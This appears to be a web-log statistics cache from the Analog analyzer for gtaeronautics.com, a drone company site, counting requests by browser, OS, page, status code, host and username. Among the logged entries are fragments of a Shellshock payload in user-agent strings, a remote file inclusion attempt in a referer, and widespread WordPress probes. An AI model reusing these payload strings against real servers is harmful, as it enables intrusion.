x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	04	02	05	51
x	FR	2007	12	18	17	05
x	LR	2023	03	31	23	21
x	E7	2023	04	02	05	51
x	SR	1120693
x	S7	1678
x	NC	437829
x	C7	0
x	FL	448156
x	F7	542
x	RR	199
x	R7	2
x	NH	98912
x	H7	326
x	BT	54672653602
x	B7	198448159
1	Rr	27695	2.471	2023
1	Rr	82334	7.347	2022
1	Rr	98917	8.826	2021
1	Rr	89380	7.975	2020
1	Rr	80088	7.146	2019
1	Rr	68927	6.150	2018
1	Rr	60168	5.369	2017
1	Rr	73316	6.542	2016
1	Rr	80796	7.209	2015
1	Rr	110773	9.884	2014
1	Rr	65173	5.815	2013
1	Rr	60742	5.420	2012
1	Rr	57015	5.087	2011
1	Rr	22139	1.975	2010
1	Rr	69710	6.220	2009
1	Rr	71820	6.409	2008
1	Rr	1700	0.152	2007
1	*BT	R	110773	2014
b	lRQq	2	1397	809516368	32.317	msnbot/1
b	lRQq	1	43	4047581840	161.586	Chrome
b	lRQq	2	2	2552241832	101.890	Chrome/108
b	lRQq	2	2	2552241832	101.890	Chrome/109
b	lRQq	2	4	2552241832	101.890	Chrome/13
b	lRQq	2	12	2552241832	101.890	Chrome/41
b	lRQq	2	1	2552241832	101.890	Chrome/33
b	lRQq	2	2	2552241832	101.890	Chrome/95
b	lRQq	2	3	2552241832	101.890	Chrome/105
b	lRQq	2	1	2552241832	101.890	Chrome/70
b	lRQq	1	2	4047581840	161.586	() { :;}; 
b	lRQq	2	2	4047581840	161.586	() { :;}; /bin/bash
b	lRQq	1	20	3923889112	156.648	com.google.GoogleMobile
b	lRQq	2	3	3361758200	134.207	com.google.GoogleMobile/42
b	lRQq	2	1	2552241832	101.890	com.google.GoogleMobile/72
b	lRQq	2	1	2552241832	101.890	com.google.GoogleMobile/65
b	lRQq	2	3	2552241832	101.890	com.google.GoogleMobile/38
b	lRQq	2	3	2552241832	101.890	com.google.GoogleMobile/60
b	lRQq	2	1	2552241832	101.890	com.google.GoogleMobile/61
b	lRQq	2	2	2552241832	101.890	com.google.GoogleMobile/34
b	lRQq	2	2	809516368	32.317	com.google.GoogleMobile/62
b	lRQq	2	2	809516368	32.317	com.google.GoogleMobile/67
b	lRQq	2	2	809516368	32.317	com.google.GoogleMobile/41
b	lRQq	1	260	3923889112	156.648	AppEngine-Google; ( http:
b	lRQq	2	260	3923889112	156.648	AppEngine-Google; ( http://code
b	lRQq	1	661167	1156927565	46.186	[not listed: 901]
p	*f	0Q	s
p	lR	1	581247	Windows
p	lR	2	76763	Windows NT
p	lR	2	246843	Unknown Windows
p	lR	2	241421	Windows XP
p	lR	2	2221	Windows 95
p	lR	2	407	Windows CE
p	lR	2	2361	Windows 98
p	lR	2	9417	Windows 2000
p	lR	2	384	Windows 3.1
p	lR	2	1430	Windows ME
p	lR	1	105131	Known robots
p	lR	1	254095	OS unknown
p	lR	1	71573	Unix
p	lR	2	70063	Linux
p	lR	2	22	SunOS
p	lR	2	60	BSD
p	lR	2	1425	Other Unix
p	lR	2	3	HP-UX
p	lR	1	98211	Macintosh
p	lR	2	93992	Unknown Macintosh
p	lR	2	3166	Macintosh PowerPC
p	lR	2	1053	Macintosh 68k
p	lR	1	16	WebTV
p	lR	1	13	BeOS
p	lR	1	35	OS/2
p	lR	1	7	Amiga
i	*f	0R	s
i	lRc	1	317859	68.599	/images/
i	lRc	1	632777	20.758	[root directory]
i	lRc	1	109985	0.073	/js/
i	lRc	1	57355	0.068	/css/
i	lRc	1	1018	10.380	/uploads/
i	lRc	1	217	0.121	/dev/
i	lRc	2	24	0.000	/dev/css/
i	lRc	2	46	0.000	/dev/js/
i	lRc	2	81	0.000	/dev/images/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	1	0.000	/secure/
i	lRc	1	74	0.000	/stats/
r	*FR	2007	12	18	17	11
r	*LR	2023	03	31	21	37
r	*f	0.050000%S	s
r	lRSc	1	29210	28	2.455	/aboutus.html
r	lRSc	1	25198	24	35.359	/compnews.html
r	lRSc	1	20131	24	1.356	/contactus.html
r	lRSc	1	2162	23	2.270	/gt100hl+rpas.html
r	lRSc	1	6761	21	2.012	/gt380+rpas.html
r	lRSc	1	15226	21	1.195	/pna.html
r	lRSc	1	23356	21	3.096	/uasfc.html
r	lRSc	1	19218	20	2.700	/consultinga.html
r	lRSc	1	18530	20	1.801	/cfmt.html
r	lRSc	1	10130	20	1.940	/sru.html
r	lRSc	1	15152	19	1.365	/indevents.html
r	lRSc	1	18422	18	2.268	/cct&m.html
r	lRSc	1	6396	18	1.662	/gt50t+rpas.html
r	lRSc	1	6807	17	1.600	/gt1500+rpas.html
r	lRSc	1	15687	14	1.495	/links.html
r	lRSc	1	13860	13	1.524	/faq.html
r	lRSc	1	16445	10	0.682	/employment.html
r	lRSc	1	10459	7	0.390	/rd.html
r	lRSc	1	27883	5	20.802	/indnews.html
r	lRSc	2	141	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	117	2	0.423	/uploads/big+horn+basin+drone+festival+event+schedule.pdf
r	lRSc	1	155	1	2.157	/uploads/idrone-pressrelease-powell-version220119.pdf
r	lRSc	1	83	1	7.588	/uploads/droneexpojan2022+(1).pdf
r	lRSc	1	3878	1	0.105	/banditomav.html
r	lRSc	1	99	1	0.000	/uploads/bighornbasindronefestivalflyer-v2-220110.pdf
r	lRSc	1	98	1	3.453	/uploads/2022wydronefestflyer+rev2.pdf
r	lRSc	1	4177	1	0.099	/uavengines.html
r	lRSc	1	3990	1	0.095	/gtatexan.html
r	lRSc	1	3725	1	0.107	/bandituas.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	981	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	256518	42.058	.jpg  [JPEG graphics]
t	lRb	1	333090	27.454	.html [Hypertext Markup Language]
t	lRb	1	263488	18.997	[directories]
t	lRb	1	466	4.935	.mp4
t	lRb	1	778	2.269	.wmv
t	lRb	1	87	2.228	.mpg  [MPEG movie]
t	lRb	1	18734	0.959	.asp  [Active Server REQUESTS]
t	lRb	1	61446	0.308	.gif  [GIF graphics]
t	lRb	1	110031	0.263	.js  [JavaScript code]
t	lRb	1	57371	0.233	.css  [Cascading Style Sheets]
t	lRb	1	552	0.210	.pdf  [Adobe Portable Document Format]
t	lRb	1	18132	0.086	[not listed: 6]
z	*FR	2023	02	28	10	28
z	*LR	2023	03	31	23	21
z	ScR	64	0.000	83539	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	72	0.006	84689	101b-  1kb
z	ScR	549	1.400	502604	1kb- 10kb
z	ScR	336	7.071	347916	10kb-100kb
z	ScR	622	58.533	97835	100kb-  1Mb
z	ScR	35	32.990	4045	1Mb- 10Mb
z	ScR	0	0.000	53	10Mb-100Mb
z	ScR	0	0.000	12	100Mb-  1Gb
c	*FR	2014	03	02	13	52
c	*LR	2023	03	31	23	21
c	*f	0R	a
c	R	1034825	200 OK
c	R	7345	206 Partial content
c	R	122	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	78523	304 Not modified since last retrieval
c	R	816	400 Bad request
c	R	207	401 Authentication required
c	R	271	403 Access forbidden
c	R	444094	404 Document not found
c	R	1356	405 Method not allowed
c	R	562	406 Document not acceptable to client
c	R	104	416 Requested range not valid
c	R	618	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2023	03	31	23	19
I	*f	-30S	s
I	lRS	1	109119	152	/robots.txt
I	lRS	1	3938	13	/ads.txt
I	lRS	1	606	7	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	586	7	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	610	7	/web/wp-includes/wlwmanifest.xml
I	lRS	1	2508	7	/xmlrpc.php
I	lRS	1	750	7	/blog/wp-includes/wlwmanifest.xml
I	lRS	1	6611	7	/wp-login.php
I	lRS	1	749	7	/wordpress/wp-includes/wlwmanifest.xml
I	lRS	1	750	7	/wp/wp-includes/wlwmanifest.xml
I	lRS	1	747	7	/cms/wp-includes/wlwmanifest.xml
I	lRS	1	607	7	/test/wp-includes/wlwmanifest.xml
I	lRS	1	750	7	/site/wp-includes/wlwmanifest.xml
I	lRS	1	484	6	/2019/wp-includes/wlwmanifest.xml
I	lRS	1	564	6	/sito/wp-includes/wlwmanifest.xml
I	lRS	1	566	6	/website/wp-includes/wlwmanifest.xml
I	lRS	1	566	6	/news/wp-includes/wlwmanifest.xml
I	lRS	1	567	6	/wp2/wp-includes/wlwmanifest.xml
I	lRS	1	757	5	/wp-includes/wlwmanifest.xml
I	lRS	1	165	5	/2020/wp-includes/wlwmanifest.xml
I	lRS	1	964	4	/sitemap.xml
I	lRS	1	12	4	/download.php
I	lRS	1	54	4	/blog
I	lRS	1	1842	4	/plus/mytag_js.php
I	lRS	1	220	4	/mobile
I	lRS	1	80	4	/backup
I	lRS	1	171	4	/data/admin/ver.txt
I	lRS	1	72	4	/new
I	lRS	1	79	4	/old
I	lRS	1	8	4	/carbuyaction.php
I	lRS	1	312615	220	[not listed: 24113]
L	*FR	2007	12	11	00	52
L	*LR	2023	03	31	23	19
L	*f	-20S	s
L	RS	60	60	14.225.19.86
L	RS	42	42	185.207.109.103
L	RS	36	36	34.89.142.176
L	RS	34	34	20.164.200.183
L	RS	20	20	13.231.247.17
L	RS	18	17	185.81.157.208
L	RS	17	17	108.61.204.113
L	RS	17	17	35.193.0.25
L	RS	17	17	40.80.83.88
L	RS	85	16	20.241.233.77
L	RS	15	15	103.83.81.48
L	RS	10	10	49.51.182.226
L	RS	8	8	45.89.228.232
L	RS	15	8	46.17.41.115
L	RS	8	8	20.244.37.144
L	RS	23	8	157.55.39.225
L	RS	8	8	194.163.155.246
L	RS	16	6	66.249.64.222
L	RS	154	6	162.55.85.223
L	RS	6	5	194.38.23.179
L	RS	447547	184	[not listed: 80168]
K	*FR	2013	12	22	04	20
K	*LR	2023	03	31	23	19
K	*f	-30S	s
K	lRS	1	1100	4	http://gtaeronautics.com/
K	lRS	1	89	3	https://www.google.com
K	lRS	1	1	1	http://gtaeronautics.com/0.php
K	lRS	1	20837	1	http://www.gtaeronautics.com/
K	lRS	1	3	1	http://www.gtaeronautics.com/Upfile_Photo.asp
K	lRS	1	31241	0	[not listed: 4967]
E	*FR	2008	01	06	10	12
E	*LR	2023	03	28	06	18
E	*f	-30S	s
E	lSR	1	2	31	/dev
E	lSR	1	0	168	[not listed: 5]
l	*FR	2008	01	06	10	12
l	*LR	2023	03	28	06	18
l	*f	-20S	s
l	SR	2	2	14.225.19.86
l	SR	0	197	[not listed: 109]
v	*f	-20B	b
v	Rb	463278	63.286	64.41.87.40
v	Rb	657415	36.714	66.113.131.59
R	*FR	2008	01	06	10	12
R	*LR	2023	03	28	06	18
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	21	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2023	03	31	23	19
M	*f	-20R	r
M	R	302606	66.113.131.59
M	R	145550	64.41.87.40
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2023	03	13	15	18
P	*LR	2023	03	31	23	21
P	R	84	0
P	R	0	<= 0.01
P	R	998	0.01-0.02
P	R	39247	0.02-0.05
P	R	82516	0.05-0.1 
P	R	105297	0.1 -0.2 
P	R	110023	0.2 -0.5 
P	R	54420	0.5 -1   
P	R	32160	1-  2 
P	R	13842	2-  5 
P	R	7839	5- 10 
P	R	3375	10- 20 
P	R	11974	20- 60 
P	R	1203	60-120 
P	R	268	120-300 
